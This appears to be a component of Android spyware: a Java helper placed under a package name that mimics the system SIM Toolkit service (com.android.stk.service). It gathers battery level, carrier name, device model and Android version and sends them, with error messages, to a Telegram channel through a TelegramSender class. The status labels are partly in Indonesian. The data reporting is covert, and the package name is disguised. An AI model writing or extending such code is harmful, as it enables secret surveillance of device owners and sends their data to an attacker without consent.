package com.android.stk.service;

import android.content.Context;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.TelephonyManager;

public class StatusHelper {

    public static void sendStatus(Context context) {
        try {
            // Battery level
            int batteryLevel = -1;
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) {
                batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }

            // Operator name
            String operator = "Unknown";
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                operator = tm.getNetworkOperatorName();
                if (operator == null || operator.trim().isEmpty()) {
                    operator = "Tidak terdeteksi";
                }
            }

            String status = "📊 STATUS DEVICE\n" +
                    "🔋 Battery: " + (batteryLevel >= 0 ? batteryLevel + "%" : "N/A") + "\n" +
                    "📶 Operator: " + operator + "\n" +
                    "📱 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                    "🤖 Android: " + Build.VERSION.RELEASE;

            TelegramSender.sendText(status);

        } catch (Exception e) {
            TelegramSender.sendText("❌ Gagal ambil status: " + e.getMessage());
        }
    }
}
